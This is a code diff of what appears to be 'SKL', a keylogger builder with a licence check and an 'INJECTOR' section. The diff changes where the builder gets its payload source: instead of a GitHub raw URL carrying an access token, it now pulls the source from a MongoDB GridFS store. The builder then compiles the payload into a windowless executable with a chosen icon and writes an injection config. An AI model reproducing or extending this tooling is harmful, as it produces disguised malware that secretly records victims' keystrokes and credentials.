@@ -1,16 +1,14 @@
 
 import os
 import json
-from pynput.keyboard import Key, Listener
 import smtplib, ssl
 import socket   
 import requests
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
-import psutil
-import shutil
 import sys 
-import getpass
+from gridfs import GridFS
+from bson.objectid import ObjectId
 import pygetwindow as gw
 
 #!# -----------------------------------CONSTANTS----------------------------------- #!#
@@ -263,15 +261,19 @@ def __main__():
                 File = os.path.basename(SRC)
                 logo = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
                 if logo.lower() == "none": logo = logo.upper()
-                file_url = "https://raw.githubusercontent.com/VoidyCD/SKL/main/SKL.py?token=GHSAT0AAAAAACGOZN2CNPEESKHGNZIXKGDQZHE6IJA"
-                response = requests.get(file_url)
+                database = connectToDatabase("database")
+                fs = GridFS(database)
 
-                if response.status_code == 200:
-                    with open(f"{filename}.py", "wb") as file:
-                        file.write(response.content)
+   
+                    
+                # Download the Python file
+                fsID = ObjectId("64e506d2c178cdd42d2e1031")
+                with open(f'{filename}.py', 'wb') as f:
+                    file = fs.get(fsID)
+                    f.write(file.read())
                     
                 os.system(f"pyinstaller -F -w \"{filename}\".py -i \"{logo}\"")
-                os.remove(filename)
+                os.remove(f"{filename}.py")
 
                 
                 with open("./dist/inject.json", "w") as f:
@@ -492,8 +494,10 @@ def isLicensed():
 
 #%# -----------------------------------INJECTOR----------------------------------- #%#
 
-
-
+isLicensed()
+print("Welcome to SKL, type \"help\" for a list of commands")
+printlogo()
+__main__()
 
 print(bcolors.WHITE)
        
